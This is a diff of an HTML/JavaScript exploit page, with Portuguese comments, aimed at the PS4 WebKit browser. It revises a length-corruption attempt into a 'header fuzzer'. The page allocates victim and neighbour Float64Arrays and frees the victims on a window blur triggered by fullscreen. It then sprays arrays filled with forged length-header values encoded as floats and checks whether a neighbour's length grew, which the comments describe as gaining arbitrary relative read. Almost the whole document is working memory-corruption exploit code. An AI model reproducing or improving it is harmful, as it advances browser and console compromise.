@@ -2,113 +2,130 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4: Length Corruption Attempt</title>
+<title>PS4 Webkit: Header Fuzzer</title>
 <style>
-    body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; }
-    #log { text-align: left; margin: 20px; border: 1px solid #444; padding: 10px; }
-    .god { color: cyan; font-weight: bold; font-size: 1.5em; animation: blink 1s infinite; }
-    @keyframes blink { 50% { opacity: 0; } }
+    body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; }
+    h1 { text-shadow: 0 0 10px #0f0; }
+    #log { text-align: left; margin: 20px; border: 1px solid #333; padding: 10px; height: 300px; overflow-y: scroll;}
+    .success { color: #fff; background: #00aa00; font-size: 1.5em; padding: 10px; display: block; }
 </style>
 </head>
 <body>
 
-<h1>GOD MODE ATTEMPT (Length Corruption)</h1>
-<div id="status">Prepare-se...</div>
-<button onclick="fire()">INICIAR</button>
-<div id="log"></div>
+<h1>HEADER HUNTER v1.0</h1>
+<div id="status">Status: PRONTO PARA FUZZING</div>
+<br>
+<button onclick="fire()" style="padding:20px; font-size:1.2em; font-weight:bold; cursor:pointer;">INICIAR CAÇADA</button>
+<div id="log">Logs...</div>
 
 <script>
     const Log = document.getElementById('log');
-    function log(txt) { Log.innerHTML += txt + "<br>"; }
+    function log(txt) { Log.innerHTML += ">> " + txt + "<br>"; Log.scrollTop = Log.scrollHeight;}
 
-    // DADOS:
-    // Estamos tentando forjar um cabeçalho.
-    // 0x0001000000000010 -> Length = 0x10000, Flags = 0x10 (Pode variar)
-    // Em float, isso é aprox: 1.3906717577229e-309
-    const FAKE_HEADER = 1.3906717577229e-309; 
+    // --- LISTA DE CABEÇALHOS CANDIDATOS (VIP LIST) ---
+    // Estes são valores float que, em hex, representam headers válidos com length gigante.
+    const CANDIDATES = [
+        // 1. O Clássico: Length=0x10000 | Flags=0x10
+        // Hex: 0x0001000000000010
+        1.3906717577229e-309, 
 
-    // O "Lixo" seguro para preencher o resto
-    const PADDING = 1.1;
+        // 2. O Agressivo: Length=0x20000 (Dobro)
+        // Hex: 0x0002000000000010
+        2.7813435154458e-309,
+
+        // 3. O Estrutural: Tenta preservar StructureID baixo
+        // Hex: 0x0001000000000000
+        1.3906717577225e-309,
+
+        // 4. O "Shifted": As vezes o alinhamento está deslocado
+        // Hex: 0x0000001000010000
+        2.1729236899484e-311
+    ];
 
     let victims = [];
     let neighbors = [];
     const COUNT = 10000;
 
     function fire() {
-        document.getElementById('status').innerText = "Alocando...";
+        document.getElementById('status').innerText = "Alocando Memória...";
+        log("Iniciando preparação do Heap...");
 
-        // Layout: [ VIZINHO ] [ VÍTIMA ]
-        // Tentamos corromper o vizinho que vem DEPOIS na memória?
-        // Ou o overflow acontece para trás?
-        // No seu teste anterior, você corrompeu o índice 0. Isso sugere que
-        // a vítima foi liberada e o spray ocupou o lugar dela E vazou para o PRÓXIMO bloco.
-        
+        // Alocação Vizinho | Vítima
         for(let i=0; i<COUNT; i++) {
             // Vítima (será deletada)
-            let v = new Float64Array(16); 
+            let v = new Float64Array(16);
             victims.push(v);
 
-            // Vizinho (será corrompido)
+            // Vizinho (esperamos corromper o Length deste cara)
+            // Preenchemos com 0 para facilitar detecção
             let n = new Float64Array(16);
-            n.fill(PADDING); 
+            n.fill(0); 
             neighbors.push(n);
         }
 
-        document.getElementById('status').innerText = "PRONTO. APERTE OPTIONS.";
+        log("Heap pronto. Pressione OPTIONS para disparar o Fuzzer.");
+        document.getElementById('status').innerText = "APERTE OPTIONS AGORA";
 
+        // Trigger
         const doc = document.documentElement;
         if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
         else if (doc.requestFullscreen) doc.requestFullscreen();
 
         window.onblur = function() {
-            log("Exploit Triggered...");
-            
-            // 1. Libera Vítimas
+            log("Blur detectado! Disparando Spray Rotativo...");
+
+            // 1. FREE
             victims = null;
 
-            // 2. Spray Cirúrgico
-            // Tentamos criar um spray onde o ÚLTIMO valor seja o header do próximo
+            // 2. SPRAY INTELIGENTE
+            // Vamos criar arrays que usam os Candidatos em rotação.
             let spray = [];
             try {
-                // Tentamos tamanhos variados para "alinhar" o final do spray 
-                // com o começo do vizinho.
                 for(let i=0; i<COUNT*2; i++) {
-                    // Tamanho 24 (overflow de 8 doubles = 64 bytes)
+                    // Tamanho 24 para garantir overflow
                     let s = new Float64Array(24);
-                    // Preenche com lixo seguro
-                    s.fill(PADDING);
-                    // Coloca o Header Falso nas últimas posições (onde o overflow ocorre)
-                    s[16] = FAKE_HEADER; // Início do overflow?
-                    s[17] = FAKE_HEADER;
-                    s[18] = FAKE_HEADER;
-                    s[19] = FAKE_HEADER; 
+                    
+                    // Escolhe um candidato da lista baseado no índice
+                    // Isso garante que testamos TODOS os headers na mesma execução
+                    let header_guess = CANDIDATES[i % CANDIDATES.length];
+                    
+                    // Enche o array com esse candidato
+                    // Assim, onde quer que o overflow bata, vai escrever esse header
+                    s.fill(header_guess);
+                    
                     spray.push(s);
                 }
             } catch(e) {}
 
-            // 3. Checagem
-            checkGodMode();
+            // 3. VERIFICAÇÃO
+            checkResults();
         };
     }
 
-    function checkGodMode() {
+    function checkResults() {
+        log("Verificando se algum Length mudou...");
         let success = false;
+
         for(let i=0; i<COUNT; i++) {
-            // O vizinho deveria ter length 16.
-            // Se tiver mudado, vencemos.
-            if(neighbors[i].length > 16) {
+            // O tamanho original é 16.
+            // Se for diferente, conseguimos!
+            if(neighbors[i].length !== 16) {
                 success = true;
-                document.body.style.background = "#000055";
-                Log.innerHTML += `<div class="god">GOD MODE ATIVADO!</div>`;
-                log(`Vizinho [${i}] agora tem tamanho: ${neighbors[i].length}`);
-                log("Você agora tem leitura relativa arbitrária!");
-                break;
+                document.body.style.background = "#000088";
+                
+                let msg = "SUCESSO! Header encontrado!";
+                Log.innerHTML += `<span class="success">${msg}</span>`;
+                log("Vizinho Index: " + i);
+                log("Novo Length: " + neighbors[i].length);
+                log("Use o valor hexadecimal correspondente no seu exploit final.");
+                return;
             }
         }
-        
+
         if(!success) {
-            log("Overflow ocorreu, mas não acertamos o Length.");
-            log("Tente ajustar o índice do FAKE_HEADER no array de spray.");
+            log("[-] Falha. Nenhum header funcionou desta vez.");
+            log("O console não crashou? Então tente adicionar mais candidatos na lista.");
+            document.body.style.background = "#330000";
         }
     }
 </script>
